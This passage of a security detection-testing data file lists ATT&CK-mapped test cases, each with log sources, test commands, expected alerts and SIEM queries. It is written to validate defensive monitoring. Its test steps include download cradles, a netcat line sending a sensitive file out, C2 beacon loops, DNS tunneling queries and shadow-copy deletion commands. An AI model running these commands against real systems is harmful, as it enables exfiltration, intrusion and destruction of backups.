        'PowerShell: Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "calc.exe"',
        'wmic /node:target os get caption (remote OS info)',
        'Verify wmiprvse.exe spawning child processes on target'
      ],
      expectedAlerts: [
        'WMI remote execution detected',
        'wmiprvse.exe spawning suspicious process',
        'WMI lateral movement to multiple hosts',
        'Remote process creation via WMI',
        'WMI process creation from non-admin context'
      ],
      siemQueryExample: 'process.parent.name:"wmiprvse.exe" AND process.name:("cmd.exe" OR "powershell.exe") | stats count by host.name, process.command_line',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md'
    }
  },
  {
    id: 'vt-t1021-006',
    name: 'PSExec / Remote Services',
    tactic: 'Lateral Movement',
    technique: 'T1021.006',
    techniqueName: 'Remote Services: Windows Remote Management',
    description: 'Test detection of PSExec-style remote execution',
    expectedLogSources: ['Windows Security', 'Sysmon', 'EDR'],
    testProcedure: 'Use PSExec to execute command on remote system',
    expectedFields: ['source_host', 'dest_host', 'service_name', 'user'],
    guidance: {
      whatToLookFor: [
        'Windows System Event ID 7045 (New Service Created) named PSEXESVC or similar',
        'Sysmon Event ID 1 showing psexec.exe execution',
        'Sysmon Event ID 17/18 (Named Pipe) for \\\\*\\PIPE\\psexesvc',
        'File creation in \\Windows\\ for PSEXESVC.exe',
        'Logon Type 3 (Network) followed by immediate service installation'
      ],
      howToTest: [
        'psexec \\\\target -u DOMAIN\\admin -p password cmd.exe',
        'psexec \\\\target -s cmd.exe (run as SYSTEM)',
        'psexec \\\\target -c malware.exe (copy and execute)',
        'PowerShell remoting: Invoke-Command -ComputerName target -ScriptBlock { whoami }',
        'CLEANUP: psexec installs service; it cleans up on disconnect'
      ],
      expectedAlerts: [
        'PSExec service installation detected',
        'Remote command execution via PSExec',
        'Named pipe creation for remote execution tool',
        'Lateral movement detected - service created on remote host',
        'PSExec-like behavior detected (service + named pipe pattern)'
      ],
      siemQueryExample: 'event.code:7045 AND winlog.event_data.ServiceFileName:("*PSEXE*" OR "*\\\\ADMIN$*" OR "*\\\\C$*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md'
    }
  },

  // Collection
  {
    id: 'vt-t1560-001',
    name: 'Archive via Utility',
    tactic: 'Collection',
    technique: 'T1560.001',
    techniqueName: 'Archive Collected Data: Archive via Utility',
    description: 'Test detection of data archiving for exfiltration',
    expectedLogSources: ['Sysmon', 'EDR', 'DLP'],
    testProcedure: 'Create password-protected archive of sensitive files',
    expectedFields: ['archive_tool', 'file_path', 'user', 'file_size'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing 7z.exe, rar.exe, WinRAR.exe, or zip.exe execution',
        'Command lines with -p (password) parameter in compression tools',
        'Large archive files created in user directories or temp folders',
        'PowerShell Compress-Archive cmdlet usage',
        'Multiple files being compressed at once (staging for exfil)'
      ],
      howToTest: [
        '7z a -pSecretPassword archive.7z C:\\Users\\*\\Documents\\*.docx',
        'PowerShell: Compress-Archive -Path C:\\Data\\* -DestinationPath C:\\temp\\archive.zip',
        'makecab /d CabinetName=archive.cab C:\\Data\\sensitive.docx',
        'tar -cvf archive.tar C:\\Data\\ (if GNU tar is installed)',
        'Create archive of files >100MB to test size-based alerts'
      ],
      expectedAlerts: [
        'Large archive file created',
        'Password-protected archive created',
        'Archive created in suspicious location',
        'Compression of sensitive file types (docx, xlsx, pst)',
        'Archive created by suspicious process'
      ],
      siemQueryExample: 'process.name:("7z.exe" OR "rar.exe" OR "WinRAR.exe") OR (process.name:"powershell.exe" AND process.command_line:"*Compress-Archive*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md'
    }
  },
  {
    id: 'vt-t1114-002',
    name: 'Email Collection - Remote',
    tactic: 'Collection',
    technique: 'T1114.002',
    techniqueName: 'Email Collection: Remote Email Collection',
    description: 'Test detection of mailbox access',
    expectedLogSources: ['Exchange', 'Microsoft 365', 'Email Gateway'],
    testProcedure: 'Access mailbox via EWS/Graph API and verify audit log',
    expectedFields: ['mailbox', 'accessor', 'operation', 'client_ip'],
    guidance: {
      whatToLookFor: [
        'Exchange/O365 Unified Audit Log - MailItemsAccessed operations',
        'Mailbox audit log - SendAs, SendOnBehalf, FullAccess operations',
        'Graph API calls to /users/{id}/messages endpoints',
        'EWS (Exchange Web Services) operations in IIS logs',
        'Unusual volume of email export or sync operations'
      ],
      howToTest: [
        'Outlook: Configure additional mailbox access and read emails',
        'PowerShell EWS: Use EWS Managed API to access mailbox items',
        'Graph API: GET https://graph.microsoft.com/v1.0/me/messages',
        'Export mailbox: New-MailboxExportRequest (Exchange on-prem)',
        'Verify mailbox audit logging is enabled: Get-Mailbox -Identity user | FL *Audit*'
      ],
      expectedAlerts: [
        'Mailbox accessed by delegate/service account',
        'Large volume of emails accessed/exported',
        'Mailbox accessed from unusual location/IP',
        'FullAccess permission used outside normal pattern',
        'Email export to PST file detected'
      ],
      siemQueryExample: 'source:"O365_Audit" AND operation:("MailItemsAccessed" OR "SendAs" OR "FullAccess") AND NOT user.name:*system*',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.002/T1114.002.md'
    }
  },

  // Command and Control
  {
    id: 'vt-t1071-001',
    name: 'Web Protocol C2',
    tactic: 'Command and Control',
    technique: 'T1071.001',
    techniqueName: 'Application Layer Protocol: Web Protocols',
    description: 'Test detection of HTTP/S-based C2 traffic',
    expectedLogSources: ['Proxy', 'Firewall', 'DNS', 'EDR'],
    testProcedure: 'Generate simulated C2 beacon traffic to known test domain',
    expectedFields: ['dest_domain', 'dest_ip', 'user_agent', 'bytes_out'],
    guidance: {
      whatToLookFor: [
        'Proxy logs showing periodic/beaconing HTTP(S) requests',
        'Connections to known C2 infrastructure (threat intel IOCs)',
        'Unusual User-Agent strings or missing User-Agent',
        'High frequency requests to single domain with small response sizes',
        'HTTPS connections to IP addresses (no SNI/hostname)'
      ],
      howToTest: [
        'curl -A "Mozilla/5.0" http://testdomain.com/beacon every 60 seconds',
        'PowerShell beacon: while($true){Invoke-WebRequest http://test.local/c2;Start-Sleep 60}',
        'Use Atomic Red Team HTTP C2 simulation tests',
        'Generate traffic to known-bad test domains (if available in lab)',
        'Vary beacon intervals: fixed (60s), jittered (45-75s), etc.'
      ],
      expectedAlerts: [
        'Beaconing activity detected - periodic HTTP requests',
        'Connection to known C2 infrastructure',
        'Suspicious User-Agent detected',
        'Long-running HTTP session (keep-alive abuse)',
        'HTTP traffic to rare/new domain'
      ],
      siemQueryExample: 'event.category:"web" | bin span=5m @timestamp | stats count, dc(url.domain) by source.ip, @timestamp | where count > 50 AND dc(url.domain) == 1',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md'
    }
  },
  {
    id: 'vt-t1071-004',
    name: 'DNS Tunneling',
    tactic: 'Command and Control',
    technique: 'T1071.004',
    techniqueName: 'Application Layer Protocol: DNS',
    description: 'Test detection of DNS-based data exfiltration',
    expectedLogSources: ['DNS', 'Firewall', 'EDR'],
    testProcedure: 'Send encoded data via DNS TXT queries and verify detection',
    expectedFields: ['query_name', 'query_type', 'source_ip', 'response_size'],
    guidance: {
      whatToLookFor: [
        'Unusually long DNS query names (>50 characters in subdomain)',
        'High volume of DNS TXT or NULL record queries',
        'DNS queries to recently registered or rare domains',
        'Base64 or hex-encoded patterns in DNS query names',
        'DNS queries directly to external DNS servers (bypassing internal)'
      ],
      howToTest: [
        'nslookup -type=TXT dGVzdGRhdGE=.tunnel.testdomain.com (base64 in subdomain)',
        'Use dnscat2 or iodine in lab environment for DNS tunnel testing',
        'PowerShell: Resolve-DnsName -Type TXT encodeddata.test.com',
        'Generate high volume of unique subdomains to single parent domain',
        'Test long subdomain queries: nslookup aaaaaaaaaaaaaaaaaaa.test.com'
      ],
      expectedAlerts: [
        'DNS tunneling detected - encoded data in queries',
        'Excessive DNS queries to single domain',
        'Long DNS query name detected',
        'Unusual DNS record type (TXT, NULL) volume',
        'DNS queries bypassing corporate DNS servers'
      ],
      siemQueryExample: 'dns.question.type:("TXT" OR "NULL") | where length(dns.question.name) > 50 | stats count by source.ip, dns.question.registered_domain',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.004/T1071.004.md'
    }
  },
  {
    id: 'vt-t1105',
    name: 'Ingress Tool Transfer',
    tactic: 'Command and Control',
    technique: 'T1105',
    techniqueName: 'Ingress Tool Transfer',
    description: 'Test detection of tool download to compromised host',
    expectedLogSources: ['Proxy', 'Sysmon', 'EDR', 'Firewall'],
    testProcedure: 'Download file via certutil/PowerShell and verify logging',
    expectedFields: ['url', 'file_path', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing certutil.exe, curl.exe, wget.exe, or bitsadmin.exe',
        'PowerShell with DownloadFile, DownloadString, or Invoke-WebRequest',
        'Proxy logs showing executable downloads (Content-Type, file extension)',
        'File creation events following network download activity',
        'Downloads to temp folders, user profiles, or unusual locations'
      ],
      howToTest: [
        'certutil -urlcache -split -f http://test.local/file.exe c:\\temp\\file.exe',
        'PowerShell: Invoke-WebRequest -Uri http://test.local/file.exe -OutFile c:\\temp\\file.exe',
        'PowerShell: (New-Object Net.WebClient).DownloadFile("http://test.local/file.exe","c:\\temp\\file.exe")',
        'bitsadmin /transfer job /download /priority high http://test.local/file.exe c:\\temp\\file.exe',
        'curl -o c:\\temp\\file.exe http://test.local/file.exe (if curl available)'
      ],
      expectedAlerts: [
        'Executable downloaded via LOLBin (certutil, bitsadmin)',
        'PowerShell download cradle detected',
        'File downloaded to suspicious location',
        'Download of executable from rare/new domain',
        'Tool download followed by execution'
      ],
      siemQueryExample: 'process.name:("certutil.exe" OR "bitsadmin.exe") AND process.command_line:("*http*" OR "*ftp*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md'
    }
  },

  // Exfiltration
  {
    id: 'vt-t1048-003',
    name: 'Exfiltration Over Unencrypted Protocol',
    tactic: 'Exfiltration',
    technique: 'T1048.003',
    techniqueName: 'Exfiltration Over Alternative Protocol: Unencrypted',
    description: 'Test detection of data exfiltration via FTP/HTTP',
    expectedLogSources: ['Firewall', 'Proxy', 'DLP', 'Zeek'],
    testProcedure: 'Upload test file via FTP/HTTP POST and verify detection',
    expectedFields: ['dest_ip', 'protocol', 'bytes_out', 'file_name'],
    guidance: {
      whatToLookFor: [
        'Firewall logs showing large outbound data transfers',
        'FTP connections (port 21) to external IPs',
        'HTTP POST requests with large Content-Length',
        'Proxy logs showing file uploads (multipart/form-data)',
        'Unusual outbound data volume from single host'
      ],
      howToTest: [
        'FTP upload: ftp -n testftp.local -> put largefile.txt',
        'HTTP POST: curl -X POST -F "file=@testfile.txt" http://test.local/upload',
        'PowerShell: Invoke-RestMethod -Uri http://test.local/upload -Method Post -InFile testfile.txt',
        'Create 100MB test file and upload to verify size-based alerts',
        'Use netcat: nc external.server 8080 < sensitive.txt'
      ],
      expectedAlerts: [
        'Large outbound file transfer detected',
        'FTP connection to external IP',
        'Data exfiltration via HTTP POST',
        'Unusual upload volume from workstation',
        'Sensitive file type uploaded externally'
      ],
      siemQueryExample: 'network.direction:"outbound" AND destination.bytes > 10000000 AND NOT destination.ip:10.* | stats sum(destination.bytes) by source.ip, destination.ip',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md'
    }
  },
  {
    id: 'vt-t1567-002',
    name: 'Exfiltration to Cloud Storage',
    tactic: 'Exfiltration',
    technique: 'T1567.002',
    techniqueName: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage',
    description: 'Test detection of uploads to cloud storage',
    expectedLogSources: ['Proxy', 'CASB', 'DLP', 'Firewall'],
    testProcedure: 'Upload file to Dropbox/OneDrive/Google Drive and verify logging',
    expectedFields: ['service', 'file_name', 'user', 'bytes_out'],
    guidance: {
      whatToLookFor: [
        'Proxy/CASB logs showing uploads to cloud storage domains',
        'Connections to *.dropbox.com, *.onedrive.com, *.googleapis.com, etc.',
        'Large HTTPS uploads (bytes_out > threshold)',
        'Personal cloud storage used from corporate network',
        'API calls to cloud storage services'
      ],
      howToTest: [
        'Upload file via browser to personal Dropbox/Google Drive',
        'Use cloud storage desktop client to sync sensitive folder',
        'PowerShell/rclone to upload file programmatically',
        'Test upload of various file sizes (1MB, 10MB, 100MB)',
        'Upload via cloud storage API if available in test environment'
      ],
      expectedAlerts: [
        'Upload to personal cloud storage detected',
        'Large file uploaded to cloud storage',
        'Sensitive file type uploaded to cloud',
        'Unsanctioned cloud storage service used',
        'Bulk upload to cloud storage (multiple files)'
      ],
      siemQueryExample: 'url.domain:("*dropbox.com" OR "*drive.google.com" OR "*onedrive.com") AND http.request.method:"POST" AND http.request.bytes > 1000000',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.md'
    }
  },

  // Impact
  {
    id: 'vt-t1486',
    name: 'Data Encrypted for Impact',
    tactic: 'Impact',
    technique: 'T1486',
    techniqueName: 'Data Encrypted for Impact',
    description: 'Test detection of ransomware-like encryption activity',
    expectedLogSources: ['EDR', 'Sysmon', 'File Integrity Monitoring'],
    testProcedure: 'Run encryption simulation on test files and verify detection',
    expectedFields: ['file_count', 'extension_change', 'process', 'user'],
    guidance: {
      whatToLookFor: [
        'High volume of file modification events in short time',
        'File extension changes to known ransomware extensions (.encrypted, .locked, etc.)',
        'Sysmon Event ID 11 (FileCreate) for ransom notes (README.txt, DECRYPT.txt)',
        'Process accessing many files rapidly across directories',
        'Deletion of Volume Shadow Copies (vssadmin, wmic shadowcopy)'
      ],
      howToTest: [
        'SAFE: Use ransomware simulation tool like RanSim from KnowBe4',
        'SAFE: Write PowerShell to rename file extensions in test folder only',
        'SAFE: $files = Get-ChildItem C:\\TestFolder\\*; foreach($f in $files){Rename-Item $f "$($f.Name).encrypted"}',
        'Create canary files (honeypot files) and monitor for access',
        'NEVER run actual ransomware even in testing - use simulation only'
      ],
      expectedAlerts: [
        'Ransomware activity detected - mass file encryption',
        'Known ransomware file extension detected',
        'Ransomware note file created',
        'Volume Shadow Copy deletion',
        'Honeypot/canary file modified'
      ],
      siemQueryExample: 'event.code:11 AND file.extension:("encrypted" OR "locked" OR "crypto") | stats count by host.name, process.name | where count > 100',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md'
    }
  },
  {
    id: 'vt-t1490',
    name: 'Inhibit System Recovery',
    tactic: 'Impact',
    technique: 'T1490',
    techniqueName: 'Inhibit System Recovery',
    description: 'Test detection of backup/recovery sabotage',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Execute vssadmin delete shadows and verify process logging',
    expectedFields: ['command_line', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing vssadmin.exe with "delete shadows"',
        'wmic.exe with "shadowcopy delete" in command line',
        'bcdedit.exe modifying recovery settings',
        'wbadmin.exe deleting backup catalog',
        'Deletion or modification of System Restore points'
      ],
      howToTest: [
        'vssadmin list shadows (list existing shadow copies first)',
        'vssadmin delete shadows /all /quiet (deletes all shadow copies)',
        'wmic shadowcopy delete (alternative deletion method)',
        'bcdedit /set {default} recoveryenabled no (disable recovery mode)',
        'IMPORTANT: Test in isolated VM - this destroys recovery options'
      ],
      expectedAlerts: [
        'Volume Shadow Copy deletion detected',
        'System recovery options disabled',
        'Backup catalog deleted',
        'Recovery inhibition - precursor to ransomware',
        'Multiple recovery sabotage techniques in sequence'
      ],
      siemQueryExample: 'process.name:("vssadmin.exe" OR "wmic.exe" OR "bcdedit.exe") AND process.command_line:("*delete*shadow*" OR "*recoveryenabled*no*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md'
    }
  },
];
